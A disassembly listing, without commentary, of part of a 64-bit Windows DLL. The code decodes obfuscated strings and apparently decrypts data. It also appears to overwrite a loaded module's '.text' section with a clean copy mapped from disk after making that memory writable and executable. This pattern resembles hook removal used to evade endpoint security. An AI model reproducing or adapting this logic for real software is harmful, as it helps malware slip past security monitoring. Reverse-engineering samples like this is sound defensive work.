   180003b7a:	c7 44 24 78 01 00 00 	movl   $0x1,0x78(%rsp)
   180003b81:	00 
   180003b82:	48 89 5d 98          	mov    %rbx,-0x68(%rbp)
   180003b86:	48 89 5d 90          	mov    %rbx,-0x70(%rbp)
   180003b8a:	89 5d 88             	mov    %ebx,-0x78(%rbp)
   180003b8d:	41 0f 10 04 24       	movups (%r12),%xmm0
   180003b92:	0f 11 45 30          	movups %xmm0,0x30(%rbp)
   180003b96:	33 c0                	xor    %eax,%eax
   180003b98:	48 89 45 a8          	mov    %rax,-0x58(%rbp)
   180003b9c:	c7 45 a0 62 00 61 00 	movl   $0x610062,-0x60(%rbp)
   180003ba3:	c7 45 a4 76 00 26 00 	movl   $0x260076,-0x5c(%rbp)
   180003baa:	48 8b 3d bf 70 3a 00 	mov    0x3a70bf(%rip),%rdi        # 0x1803aac70
   180003bb1:	48 8d 4d a0          	lea    -0x60(%rbp),%rcx
   180003bb5:	e8 06 a5 00 00       	call   0x18000e0c0
   180003bba:	48 8b d0             	mov    %rax,%rdx
   180003bbd:	45 33 c9             	xor    %r9d,%r9d
   180003bc0:	45 33 c0             	xor    %r8d,%r8d
   180003bc3:	48 8d 4d 98          	lea    -0x68(%rbp),%rcx
   180003bc7:	ff d7                	call   *%rdi
   180003bc9:	8b d0                	mov    %eax,%edx
   180003bcb:	48 8d 7d a8          	lea    -0x58(%rbp),%rdi
   180003bcf:	33 c0                	xor    %eax,%eax
   180003bd1:	b9 08 00 00 00       	mov    $0x8,%ecx
   180003bd6:	f3 aa                	rep stos %al,(%rdi)
   180003bd8:	85 d2                	test   %edx,%edx
   180003bda:	0f 88 32 02 00 00    	js     0x180003e12
   180003be0:	c7 44 24 50 60 00 4c 	movl   $0x4c0060,0x50(%rsp)
   180003be7:	00 
   180003be8:	c7 44 24 54 44 00 4f 	movl   $0x4f0044,0x54(%rsp)
   180003bef:	00 
   180003bf0:	c7 44 24 58 49 00 41 	movl   $0x410049,0x58(%rsp)
   180003bf7:	00 
   180003bf8:	c7 44 24 5c 47 00 4d 	movl   $0x4d0047,0x5c(%rsp)
   180003bff:	00 
   180003c00:	c7 44 24 60 66 00 43 	movl   $0x430066,0x60(%rsp)
   180003c07:	00 
   180003c08:	c7 44 24 64 49 00 4b 	movl   $0x4b0049,0x64(%rsp)
   180003c0f:	00 
   180003c10:	b9 2f 00 00 00       	mov    $0x2f,%ecx
   180003c15:	89 44 24 6a          	mov    %eax,0x6a(%rsp)
   180003c19:	66 89 44 24 6e       	mov    %ax,0x6e(%rsp)
   180003c1e:	0f 57 c0             	xorps  %xmm0,%xmm0
   180003c21:	0f 11 45 ca          	movups %xmm0,-0x36(%rbp)
   180003c25:	48 89 45 da          	mov    %rax,-0x26(%rbp)
   180003c29:	66 89 45 e2          	mov    %ax,-0x1e(%rbp)
   180003c2d:	0f 10 44 24 50       	movups 0x50(%rsp),%xmm0
   180003c32:	0f 11 45 b0          	movups %xmm0,-0x50(%rbp)
   180003c36:	f2 0f 10 4c 24 60    	movsd  0x60(%rsp),%xmm1
   180003c3c:	f2 0f 11 4d c0       	movsd  %xmm1,-0x40(%rbp)
   180003c41:	66 89 4d c8          	mov    %cx,-0x38(%rbp)
   180003c45:	c7 44 24 50 60 00 4c 	movl   $0x4c0060,0x50(%rsp)
   180003c4c:	00 
   180003c4d:	c7 44 24 54 44 00 4f 	movl   $0x4f0044,0x54(%rsp)
   180003c54:	00 
   180003c55:	c7 44 24 58 49 00 41 	movl   $0x410049,0x58(%rsp)
   180003c5c:	00 
   180003c5d:	c7 44 24 5c 47 00 4d 	movl   $0x4d0047,0x5c(%rsp)
   180003c64:	00 
   180003c65:	c7 44 24 60 66 00 43 	movl   $0x430066,0x60(%rsp)
   180003c6c:	00 
   180003c6d:	c7 44 24 64 49 00 4b 	movl   $0x4b0049,0x64(%rsp)
   180003c74:	00 
   180003c75:	c7 44 24 68 6c 00 72 	movl   $0x72006c,0x68(%rsp)
   180003c7c:	00 
   180003c7d:	c7 44 24 6c 72 00 32 	movl   $0x320072,0x6c(%rsp)
   180003c84:	00 
   180003c85:	0f 57 c0             	xorps  %xmm0,%xmm0
   180003c88:	0f 11 45 10          	movups %xmm0,0x10(%rbp)
   180003c8c:	0f 11 45 20          	movups %xmm0,0x20(%rbp)
   180003c90:	0f 10 44 24 50       	movups 0x50(%rsp),%xmm0
   180003c95:	0f 29 45 f0          	movaps %xmm0,-0x10(%rbp)
   180003c99:	0f 10 4c 24 60       	movups 0x60(%rsp),%xmm1
   180003c9e:	0f 29 4d 00          	movaps %xmm1,0x0(%rbp)
   180003ca2:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   180003ca6:	e8 c5 a3 00 00       	call   0x18000e070
   180003cab:	48 8b f8             	mov    %rax,%rdi
   180003cae:	4c 8b 15 63 70 3a 00 	mov    0x3a7063(%rip),%r10        # 0x1803aad18
   180003cb5:	48 8d 4d b0          	lea    -0x50(%rbp),%rcx
   180003cb9:	e8 62 a7 00 00       	call   0x18000e420
   180003cbe:	49 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%r9
   180003cc5:	66 66 66 0f 1f 84 00 	data16 data16 nopw 0x0(%rax,%rax,1)
   180003ccc:	00 00 00 00 
   180003cd0:	4d 8d 49 01          	lea    0x1(%r9),%r9
   180003cd4:	66 42 83 3c 4f 00    	cmpw   $0x0,(%rdi,%r9,2)
   180003cda:	75 f4                	jne    0x180003cd0
   180003cdc:	46 8d 0c 4d 02 00 00 	lea    0x2(,%r9,2),%r9d
   180003ce3:	00 
   180003ce4:	89 5c 24 20          	mov    %ebx,0x20(%rsp)
   180003ce8:	4c 8b c7             	mov    %rdi,%r8
   180003ceb:	48 8b d0             	mov    %rax,%rdx
   180003cee:	48 8b 4d 98          	mov    -0x68(%rbp),%rcx
   180003cf2:	41 ff d2             	call   *%r10
   180003cf5:	8b d0                	mov    %eax,%edx
   180003cf7:	48 8d 7d 10          	lea    0x10(%rbp),%rdi
   180003cfb:	33 c0                	xor    %eax,%eax
   180003cfd:	b9 20 00 00 00       	mov    $0x20,%ecx
   180003d02:	f3 aa                	rep stos %al,(%rdi)
   180003d04:	48 8d 7d ca          	lea    -0x36(%rbp),%rdi
   180003d08:	b9 1a 00 00 00       	mov    $0x1a,%ecx
   180003d0d:	f3 aa                	rep stos %al,(%rdi)
   180003d0f:	85 d2                	test   %edx,%edx
   180003d11:	0f 88 fb 00 00 00    	js     0x180003e12
   180003d17:	48 8b 05 5a 6f 3a 00 	mov    0x3a6f5a(%rip),%rax        # 0x1803aac78
   180003d1e:	89 5c 24 30          	mov    %ebx,0x30(%rsp)
   180003d22:	c7 44 24 28 20 00 00 	movl   $0x20,0x28(%rsp)
   180003d29:	00 
   180003d2a:	4c 89 6c 24 20       	mov    %r13,0x20(%rsp)
   180003d2f:	45 33 c9             	xor    %r9d,%r9d
   180003d32:	45 33 c0             	xor    %r8d,%r8d
   180003d35:	48 8d 55 90          	lea    -0x70(%rbp),%rdx
   180003d39:	48 8b 4d 98          	mov    -0x68(%rbp),%rcx
   180003d3d:	ff d0                	call   *%rax
   180003d3f:	85 c0                	test   %eax,%eax
   180003d41:	0f 88 cb 00 00 00    	js     0x180003e12
   180003d47:	48 8b 05 1a 6f 3a 00 	mov    0x3a6f1a(%rip),%rax        # 0x1803aac68
   180003d4e:	c7 44 24 48 01 00 00 	movl   $0x1,0x48(%rsp)
   180003d55:	00 
   180003d56:	48 8d 4d 88          	lea    -0x78(%rbp),%rcx
   180003d5a:	48 89 4c 24 40       	mov    %rcx,0x40(%rsp)
   180003d5f:	89 5c 24 38          	mov    %ebx,0x38(%rsp)
   180003d63:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   180003d68:	c7 44 24 28 10 00 00 	movl   $0x10,0x28(%rsp)
   180003d6f:	00 
   180003d70:	48 8d 4d 30          	lea    0x30(%rbp),%rcx
   180003d74:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   180003d79:	45 33 c9             	xor    %r9d,%r9d
   180003d7c:	45 8b c7             	mov    %r15d,%r8d
   180003d7f:	49 8b d6             	mov    %r14,%rdx
   180003d82:	48 8b 4d 90          	mov    -0x70(%rbp),%rcx
   180003d86:	ff d0                	call   *%rax
   180003d88:	85 c0                	test   %eax,%eax
   180003d8a:	0f 88 82 00 00 00    	js     0x180003e12
   180003d90:	8b 7d 88             	mov    -0x78(%rbp),%edi
   180003d93:	ff 15 af 23 02 00    	call   *0x223af(%rip)        # 0x180026148
   180003d99:	44 8b c7             	mov    %edi,%r8d
   180003d9c:	ba 08 00 00 00       	mov    $0x8,%edx
   180003da1:	48 8b c8             	mov    %rax,%rcx
   180003da4:	ff 15 76 23 02 00    	call   *0x22376(%rip)        # 0x180026120
   180003daa:	48 8b d8             	mov    %rax,%rbx
   180003dad:	48 85 c0             	test   %rax,%rax
   180003db0:	74 60                	je     0x180003e12
   180003db2:	41 0f 10 04 24       	movups (%r12),%xmm0
   180003db7:	0f 11 45 30          	movups %xmm0,0x30(%rbp)
   180003dbb:	48 8b 3d a6 6e 3a 00 	mov    0x3a6ea6(%rip),%rdi        # 0x1803aac68
   180003dc2:	c7 44 24 48 01 00 00 	movl   $0x1,0x48(%rsp)
   180003dc9:	00 
   180003dca:	48 8d 45 88          	lea    -0x78(%rbp),%rax
   180003dce:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   180003dd3:	8b 45 88             	mov    -0x78(%rbp),%eax
   180003dd6:	89 44 24 38          	mov    %eax,0x38(%rsp)
   180003dda:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   180003ddf:	c7 44 24 28 10 00 00 	movl   $0x10,0x28(%rsp)
   180003de6:	00 
   180003de7:	48 8d 45 30          	lea    0x30(%rbp),%rax
   180003deb:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   180003df0:	45 33 c9             	xor    %r9d,%r9d
   180003df3:	45 8b c7             	mov    %r15d,%r8d
   180003df6:	49 8b d6             	mov    %r14,%rdx
   180003df9:	48 8b 4d 90          	mov    -0x70(%rbp),%rcx
   180003dfd:	ff d7                	call   *%rdi
   180003dff:	85 c0                	test   %eax,%eax
   180003e01:	78 0f                	js     0x180003e12
   180003e03:	44 8b 45 88          	mov    -0x78(%rbp),%r8d
   180003e07:	48 8b d3             	mov    %rbx,%rdx
   180003e0a:	48 8b ce             	mov    %rsi,%rcx
   180003e0d:	e8 fe a8 00 00       	call   0x18000e710
   180003e12:	48 8d 7d 30          	lea    0x30(%rbp),%rdi
   180003e16:	33 c0                	xor    %eax,%eax
   180003e18:	b9 10 00 00 00       	mov    $0x10,%ecx
   180003e1d:	f3 aa                	rep stos %al,(%rdi)
   180003e1f:	48 85 db             	test   %rbx,%rbx
   180003e22:	74 1c                	je     0x180003e40
   180003e24:	8b 4d 88             	mov    -0x78(%rbp),%ecx
   180003e27:	48 8b fb             	mov    %rbx,%rdi
   180003e2a:	f3 aa                	rep stos %al,(%rdi)
   180003e2c:	ff 15 16 23 02 00    	call   *0x22316(%rip)        # 0x180026148
   180003e32:	48 8b c8             	mov    %rax,%rcx
   180003e35:	4c 8b c3             	mov    %rbx,%r8
   180003e38:	33 d2                	xor    %edx,%edx
   180003e3a:	ff 15 d0 21 02 00    	call   *0x221d0(%rip)        # 0x180026010
   180003e40:	48 8b 4d 90          	mov    -0x70(%rbp),%rcx
   180003e44:	48 85 c9             	test   %rcx,%rcx
   180003e47:	74 06                	je     0x180003e4f
   180003e49:	ff 15 89 6e 3a 00    	call   *0x3a6e89(%rip)        # 0x1803aacd8
   180003e4f:	48 8b 4d 98          	mov    -0x68(%rbp),%rcx
   180003e53:	48 85 c9             	test   %rcx,%rcx
   180003e56:	74 08                	je     0x180003e60
   180003e58:	33 d2                	xor    %edx,%edx
   180003e5a:	ff 15 e0 6d 3a 00    	call   *0x3a6de0(%rip)        # 0x1803aac40
   180003e60:	48 8b c6             	mov    %rsi,%rax
   180003e63:	48 8b 4d 40          	mov    0x40(%rbp),%rcx
   180003e67:	48 33 cc             	xor    %rsp,%rcx
   180003e6a:	e8 41 ad 00 00       	call   0x18000ebb0
   180003e6f:	48 81 c4 58 01 00 00 	add    $0x158,%rsp
   180003e76:	41 5f                	pop    %r15
   180003e78:	41 5e                	pop    %r14
   180003e7a:	41 5d                	pop    %r13
   180003e7c:	41 5c                	pop    %r12
   180003e7e:	5f                   	pop    %rdi
   180003e7f:	5e                   	pop    %rsi
   180003e80:	5b                   	pop    %rbx
   180003e81:	5d                   	pop    %rbp
   180003e82:	c3                   	ret
   180003e83:	cc                   	int3
   180003e84:	cc                   	int3
   180003e85:	cc                   	int3
   180003e86:	cc                   	int3
   180003e87:	cc                   	int3
   180003e88:	cc                   	int3
   180003e89:	cc                   	int3
   180003e8a:	cc                   	int3
   180003e8b:	cc                   	int3
   180003e8c:	cc                   	int3
   180003e8d:	cc                   	int3
   180003e8e:	cc                   	int3
   180003e8f:	cc                   	int3
   180003e90:	40 55                	rex push %rbp
   180003e92:	53                   	push   %rbx
   180003e93:	56                   	push   %rsi
   180003e94:	57                   	push   %rdi
   180003e95:	41 57                	push   %r15
   180003e97:	48 8d 6c 24 b0       	lea    -0x50(%rsp),%rbp
   180003e9c:	48 81 ec 50 01 00 00 	sub    $0x150,%rsp
   180003ea3:	48 8b 05 56 51 3a 00 	mov    0x3a5156(%rip),%rax        # 0x1803a9000
   180003eaa:	48 33 c4             	xor    %rsp,%rax
   180003ead:	48 89 45 40          	mov    %rax,0x40(%rbp)
   180003eb1:	33 c0                	xor    %eax,%eax
   180003eb3:	c7 45 98 4d 00 50 00 	movl   $0x50004d,-0x68(%rbp)
   180003eba:	89 45 ac             	mov    %eax,-0x54(%rbp)
   180003ebd:	48 8d 4d 98          	lea    -0x68(%rbp),%rcx
   180003ec1:	0f 57 c0             	xorps  %xmm0,%xmm0
   180003ec4:	89 45 bc             	mov    %eax,-0x44(%rbp)
   180003ec7:	0f 11 45 ac          	movups %xmm0,-0x54(%rbp)
   180003ecb:	c7 45 9c 41 00 4a 00 	movl   $0x4a0041,-0x64(%rbp)
   180003ed2:	c7 45 a0 4b 00 06 00 	movl   $0x6004b,-0x60(%rbp)
   180003ed9:	c7 45 a4 4d 00 46 00 	movl   $0x46004d,-0x5c(%rbp)
   180003ee0:	c7 45 a8 47 00 2c 00 	movl   $0x2c0047,-0x58(%rbp)
   180003ee7:	e8 d4 a5 00 00       	call   0x18000e4c0
   180003eec:	48 8b c8             	mov    %rax,%rcx
   180003eef:	ff 15 63 22 02 00    	call   *0x22263(%rip)        # 0x180026158
   180003ef5:	4c 8b f8             	mov    %rax,%r15
   180003ef8:	48 85 c0             	test   %rax,%rax
   180003efb:	75 07                	jne    0x180003f04
   180003efd:	32 d2                	xor    %dl,%dl
   180003eff:	e9 19 02 00 00       	jmp    0x18000411d
   180003f04:	0f 57 c0             	xorps  %xmm0,%xmm0
   180003f07:	4c 89 a4 24 80 01 00 	mov    %r12,0x180(%rsp)
   180003f0e:	00 
   180003f0f:	33 c0                	xor    %eax,%eax
   180003f11:	c7 44 24 40 60 00 1e 	movl   $0x1e0060,0x40(%rsp)
   180003f18:	00 
   180003f19:	0f 11 45 fc          	movups %xmm0,-0x4(%rbp)
   180003f1d:	48 89 45 2c          	mov    %rax,0x2c(%rbp)
   180003f21:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   180003f25:	0f 11 45 0c          	movups %xmm0,0xc(%rbp)
   180003f29:	89 45 34             	mov    %eax,0x34(%rbp)
   180003f2c:	0f 11 45 1c          	movups %xmm0,0x1c(%rbp)
   180003f30:	c7 44 24 44 79 00 71 	movl   $0x710079,0x44(%rsp)
   180003f37:	00 
   180003f38:	c7 44 24 48 4e 00 46 	movl   $0x46004e,0x48(%rsp)
   180003f3f:	00 
   180003f40:	c7 44 24 4c 4d 00 45 	movl   $0x45004d,0x4c(%rsp)
   180003f47:	00 
   180003f48:	0f 28 44 24 40       	movaps 0x40(%rsp),%xmm0
   180003f4d:	0f 29 45 c0          	movaps %xmm0,-0x40(%rbp)
   180003f51:	c7 44 24 50 5c 00 5f 	movl   $0x5f005c,0x50(%rsp)
   180003f58:	00 
   180003f59:	c7 44 24 54 71 00 7d 	movl   $0x7d0071,0x54(%rsp)
   180003f60:	00 
   180003f61:	c7 44 24 58 56 00 43 	movl   $0x430056,0x58(%rsp)
   180003f68:	00 
   180003f69:	c7 44 24 5c 45 00 57 	movl   $0x570045,0x5c(%rsp)
   180003f70:	00 
   180003f71:	0f 28 4c 24 50       	movaps 0x50(%rsp),%xmm1
   180003f76:	0f 29 4d d0          	movaps %xmm1,-0x30(%rbp)
   180003f7a:	c7 44 24 60 5e 00 07 	movl   $0x7005e,0x60(%rsp)
   180003f81:	00 
   180003f82:	c7 44 24 64 07 00 6a 	movl   $0x6a0007,0x64(%rsp)
   180003f89:	00 
   180003f8a:	c7 44 24 68 59 00 4c 	movl   $0x4c0059,0x68(%rsp)
   180003f91:	00 
   180003f92:	c7 44 24 6c 5d 00 56 	movl   $0x56005d,0x6c(%rsp)
   180003f99:	00 
   180003f9a:	0f 28 44 24 60       	movaps 0x60(%rsp),%xmm0
   180003f9f:	c7 44 24 70 57 00 12 	movl   $0x120057,0x70(%rsp)
   180003fa6:	00 
   180003fa7:	c7 44 24 74 59 00 52 	movl   $0x520059,0x74(%rsp)
   180003fae:	00 
   180003faf:	f2 0f 10 4c 24 70    	movsd  0x70(%rsp),%xmm1
   180003fb5:	48 c7 44 24 78 53 00 	movq   $0x400053,0x78(%rsp)
   180003fbc:	40 00 
   180003fbe:	8b 44 24 78          	mov    0x78(%rsp),%eax
   180003fc2:	4c 89 ac 24 88 01 00 	mov    %r13,0x188(%rsp)
   180003fc9:	00 
   180003fca:	0f 29 45 e0          	movaps %xmm0,-0x20(%rbp)
   180003fce:	4c 89 b4 24 90 01 00 	mov    %r14,0x190(%rsp)
   180003fd5:	00 
   180003fd6:	f2 0f 11 4d f0       	movsd  %xmm1,-0x10(%rbp)
   180003fdb:	89 45 f8             	mov    %eax,-0x8(%rbp)
   180003fde:	e8 3d a0 00 00       	call   0x18000e020
   180003fe3:	45 33 ed             	xor    %r13d,%r13d
   180003fe6:	48 8b c8             	mov    %rax,%rcx
   180003fe9:	4c 89 6c 24 30       	mov    %r13,0x30(%rsp)
   180003fee:	45 33 c9             	xor    %r9d,%r9d
   180003ff1:	44 89 6c 24 28       	mov    %r13d,0x28(%rsp)
   180003ff6:	ba 00 00 00 80       	mov    $0x80000000,%edx
   180003ffb:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   180004001:	c7 44 24 20 03 00 00 	movl   $0x3,0x20(%rsp)
   180004008:	00 
   180004009:	ff 15 69 20 02 00    	call   *0x22069(%rip)        # 0x180026078
   18000400f:	4c 8b e0             	mov    %rax,%r12
   180004012:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   180004016:	0f 84 da 00 00 00    	je     0x1800040f6
   18000401c:	4c 89 6c 24 28       	mov    %r13,0x28(%rsp)
   180004021:	45 33 c9             	xor    %r9d,%r9d
   180004024:	33 d2                	xor    %edx,%edx
   180004026:	44 89 6c 24 20       	mov    %r13d,0x20(%rsp)
   18000402b:	41 b8 02 00 00 01    	mov    $0x1000002,%r8d
   180004031:	48 8b c8             	mov    %rax,%rcx
   180004034:	ff 15 26 21 02 00    	call   *0x22126(%rip)        # 0x180026160
   18000403a:	4c 8b f0             	mov    %rax,%r14
   18000403d:	48 85 c0             	test   %rax,%rax
   180004040:	0f 84 a7 00 00 00    	je     0x1800040ed
   180004046:	45 33 c9             	xor    %r9d,%r9d
   180004049:	4c 89 6c 24 20       	mov    %r13,0x20(%rsp)
   18000404e:	45 33 c0             	xor    %r8d,%r8d
   180004051:	ba 04 00 00 00       	mov    $0x4,%edx
   180004056:	48 8b c8             	mov    %rax,%rcx
   180004059:	ff 15 09 21 02 00    	call   *0x22109(%rip)        # 0x180026168
   18000405f:	48 8b d8             	mov    %rax,%rbx
   180004062:	48 85 c0             	test   %rax,%rax
   180004065:	74 7d                	je     0x1800040e4
   180004067:	41 ba 4d 5a 00 00    	mov    $0x5a4d,%r10d
   18000406d:	66 45 39 17          	cmp    %r10w,(%r15)
   180004071:	75 68                	jne    0x1800040db
   180004073:	4d 63 47 3c          	movslq 0x3c(%r15),%r8
   180004077:	4d 03 c7             	add    %r15,%r8
   18000407a:	41 81 38 50 45 00 00 	cmpl   $0x4550,(%r8)
   180004081:	75 58                	jne    0x1800040db
   180004083:	41 0f b7 50 14       	movzwl 0x14(%r8),%edx
   180004088:	41 0f b7 fd          	movzwl %r13w,%edi
   18000408c:	49 03 d0             	add    %r8,%rdx
   18000408f:	45 0f b7 40 06       	movzwl 0x6(%r8),%r8d
   180004094:	66 45 3b e8          	cmp    %r8w,%r13w
   180004098:	73 41                	jae    0x1800040db
   18000409a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   1800040a0:	0f b7 c7             	movzwl %di,%eax
   1800040a3:	48 8d 0c 80          	lea    (%rax,%rax,4),%rcx
   1800040a7:	80 7c ca 18 2e       	cmpb   $0x2e,0x18(%rdx,%rcx,8)
   1800040ac:	48 8d 0c cd 00 00 00 	lea    0x0(,%rcx,8),%rcx
   1800040b3:	00 
   1800040b4:	75 1c                	jne    0x1800040d2
   1800040b6:	80 7c 11 19 74       	cmpb   $0x74,0x19(%rcx,%rdx,1)
   1800040bb:	75 15                	jne    0x1800040d2
   1800040bd:	80 7c 11 1a 65       	cmpb   $0x65,0x1a(%rcx,%rdx,1)
   1800040c2:	75 0e                	jne    0x1800040d2
   1800040c4:	80 7c 11 1b 78       	cmpb   $0x78,0x1b(%rcx,%rdx,1)
   1800040c9:	75 07                	jne    0x1800040d2
   1800040cb:	80 7c 11 1c 74       	cmpb   $0x74,0x1c(%rcx,%rdx,1)
   1800040d0:	74 75                	je     0x180004147
   1800040d2:	66 ff c7             	inc    %di
   1800040d5:	66 41 3b f8          	cmp    %r8w,%di
   1800040d9:	72 c5                	jb     0x1800040a0
   1800040db:	48 8b cb             	mov    %rbx,%rcx
   1800040de:	ff 15 b4 1f 02 00    	call   *0x21fb4(%rip)        # 0x180026098
   1800040e4:	49 8b ce             	mov    %r14,%rcx
   1800040e7:	ff 15 13 20 02 00    	call   *0x22013(%rip)        # 0x180026100
   1800040ed:	49 8b cc             	mov    %r12,%rcx
   1800040f0:	ff 15 0a 20 02 00    	call   *0x2200a(%rip)        # 0x180026100
   1800040f6:	32 d2                	xor    %dl,%dl
   1800040f8:	4c 8b b4 24 90 01 00 	mov    0x190(%rsp),%r14
   1800040ff:	00 
   180004100:	48 8d 7d fc          	lea    -0x4(%rbp),%rdi
   180004104:	4c 8b ac 24 88 01 00 	mov    0x188(%rsp),%r13
   18000410b:	00 
   18000410c:	33 c0                	xor    %eax,%eax
   18000410e:	4c 8b a4 24 80 01 00 	mov    0x180(%rsp),%r12
   180004115:	00 
   180004116:	b9 3c 00 00 00       	mov    $0x3c,%ecx
   18000411b:	f3 aa                	rep stos %al,(%rdi)
   18000411d:	33 c0                	xor    %eax,%eax
   18000411f:	48 8d 7d ac          	lea    -0x54(%rbp),%rdi
   180004123:	b9 14 00 00 00       	mov    $0x14,%ecx
   180004128:	f3 aa                	rep stos %al,(%rdi)
   18000412a:	0f b6 c2             	movzbl %dl,%eax
   18000412d:	48 8b 4d 40          	mov    0x40(%rbp),%rcx
   180004131:	48 33 cc             	xor    %rsp,%rcx
   180004134:	e8 77 aa 00 00       	call   0x18000ebb0
   180004139:	48 81 c4 50 01 00 00 	add    $0x150,%rsp
   180004140:	41 5f                	pop    %r15
   180004142:	5f                   	pop    %rdi
   180004143:	5e                   	pop    %rsi
   180004144:	5b                   	pop    %rbx
   180004145:	5d                   	pop    %rbp
   180004146:	c3                   	ret
   180004147:	8b 74 11 24          	mov    0x24(%rcx,%rdx,1),%esi
   18000414b:	44 8b 4c 11 20       	mov    0x20(%rcx,%rdx,1),%r9d
   180004150:	49 03 f7             	add    %r15,%rsi
   180004153:	66 44 39 13          	cmp    %r10w,(%rbx)
   180004157:	75 82                	jne    0x1800040db
   180004159:	4c 63 43 3c          	movslq 0x3c(%rbx),%r8
   18000415d:	4c 03 c3             	add    %rbx,%r8
   180004160:	41 81 38 50 45 00 00 	cmpl   $0x4550,(%r8)
   180004167:	0f 85 6e ff ff ff    	jne    0x1800040db
   18000416d:	41 0f b7 50 14       	movzwl 0x14(%r8),%edx
   180004172:	41 0f b7 fd          	movzwl %r13w,%edi
   180004176:	49 03 d0             	add    %r8,%rdx
   180004179:	45 0f b7 40 06       	movzwl 0x6(%r8),%r8d
   18000417e:	66 45 3b e8          	cmp    %r8w,%r13w
   180004182:	0f 83 53 ff ff ff    	jae    0x1800040db
   180004188:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   18000418f:	00 
   180004190:	0f b7 c7             	movzwl %di,%eax
   180004193:	48 8d 0c 80          	lea    (%rax,%rax,4),%rcx
   180004197:	80 7c ca 18 2e       	cmpb   $0x2e,0x18(%rdx,%rcx,8)
   18000419c:	75 1c                	jne    0x1800041ba
   18000419e:	80 7c ca 19 74       	cmpb   $0x74,0x19(%rdx,%rcx,8)
   1800041a3:	75 15                	jne    0x1800041ba
   1800041a5:	80 7c ca 1a 65       	cmpb   $0x65,0x1a(%rdx,%rcx,8)
   1800041aa:	75 0e                	jne    0x1800041ba
   1800041ac:	80 7c ca 1b 78       	cmpb   $0x78,0x1b(%rdx,%rcx,8)
   1800041b1:	75 07                	jne    0x1800041ba
   1800041b3:	80 7c ca 1c 74       	cmpb   $0x74,0x1c(%rdx,%rcx,8)
   1800041b8:	74 0e                	je     0x1800041c8
   1800041ba:	66 ff c7             	inc    %di
   1800041bd:	66 41 3b f8          	cmp    %r8w,%di
   1800041c1:	72 cd                	jb     0x180004190
   1800041c3:	e9 13 ff ff ff       	jmp    0x1800040db
   1800041c8:	8b 44 ca 20          	mov    0x20(%rdx,%rcx,8),%eax
   1800041cc:	41 b8 40 00 00 00    	mov    $0x40,%r8d
   1800041d2:	44 8b 7c ca 24       	mov    0x24(%rdx,%rcx,8),%r15d
   1800041d7:	48 8b ce             	mov    %rsi,%rcx
   1800041da:	4c 03 fb             	add    %rbx,%r15
   1800041dd:	44 89 6d 90          	mov    %r13d,-0x70(%rbp)
   1800041e1:	44 3b c8             	cmp    %eax,%r9d
   1800041e4:	41 0f 42 c1          	cmovb  %r9d,%eax
   1800041e8:	4c 8d 4d 90          	lea    -0x70(%rbp),%r9
   1800041ec:	8b d0                	mov    %eax,%edx
   1800041ee:	8b f8                	mov    %eax,%edi
   1800041f0:	ff 15 d2 1e 02 00    	call   *0x21ed2(%rip)        # 0x1800260c8
   1800041f6:	85 c0                	test   %eax,%eax
   1800041f8:	0f 84 dd fe ff ff    	je     0x1800040db
   1800041fe:	44 8b c7             	mov    %edi,%r8d
   180004201:	49 8b d7             	mov    %r15,%rdx
   180004204:	48 8b ce             	mov    %rsi,%rcx
   180004207:	e8 24 02 02 00       	call   0x180024430
   18000420c:	4c 8d 4d 90          	lea    -0x70(%rbp),%r9
   180004210:	41 b8 20 00 00 00    	mov    $0x20,%r8d
   180004216:	8b d7                	mov    %edi,%edx
   180004218:	48 8b ce             	mov    %rsi,%rcx
   18000421b:	ff 15 a7 1e 02 00    	call   *0x21ea7(%rip)        # 0x1800260c8
   180004221:	48 8b cb             	mov    %rbx,%rcx
   180004224:	ff 15 6e 1e 02 00    	call   *0x21e6e(%rip)        # 0x180026098
   18000422a:	49 8b ce             	mov    %r14,%rcx
   18000422d:	ff 15 cd 1e 02 00    	call   *0x21ecd(%rip)        # 0x180026100
   180004233:	49 8b cc             	mov    %r12,%rcx
   180004236:	ff 15 c4 1e 02 00    	call   *0x21ec4(%rip)        # 0x180026100
   18000423c:	b2 01                	mov    $0x1,%dl
   18000423e:	e9 b5 fe ff ff       	jmp    0x1800040f8
   180004243:	cc                   	int3
   180004244:	cc                   	int3
   180004245:	cc                   	int3
   180004246:	cc                   	int3
   180004247:	cc                   	int3
   180004248:	cc                   	int3
   180004249:	cc                   	int3
   18000424a:	cc                   	int3
   18000424b:	cc                   	int3
   18000424c:	cc                   	int3
   18000424d:	cc                   	int3
   18000424e:	cc                   	int3
   18000424f:	cc                   	int3
   180004250:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180004255:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   18000425a:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   18000425f:	55                   	push   %rbp
   180004260:	48 8d 6c 24 a9       	lea    -0x57(%rsp),%rbp
   180004265:	48 81 ec a0 00 00 00 	sub    $0xa0,%rsp
   18000426c:	48 8b 05 8d 4d 3a 00 	mov    0x3a4d8d(%rip),%rax        # 0x1803a9000
   180004273:	48 33 c4             	xor    %rsp,%rax
   180004276:	48 89 45 47          	mov    %rax,0x47(%rbp)
   18000427a:	33 c0                	xor    %eax,%eax
   18000427c:	c7 45 1f 4d 00 50 00 	movl   $0x50004d,0x1f(%rbp)
   180004283:	0f 57 c0             	xorps  %xmm0,%xmm0
   180004286:	89 45 13             	mov    %eax,0x13(%rbp)
   180004289:	48 8d 4d 1f          	lea    0x1f(%rbp),%rcx
   18000428d:	89 45 43             	mov    %eax,0x43(%rbp)
   180004290:	0f 11 45 33          	movups %xmm0,0x33(%rbp)
   180004294:	c7 45 23 41 00 4a 00 	movl   $0x4a0041,0x23(%rbp)
   18000429b:	c7 45 27 4b 00 06 00 	movl   $0x6004b,0x27(%rbp)
   1800042a2:	c7 45 2b 4d 00 46 00 	movl   $0x46004d,0x2b(%rbp)
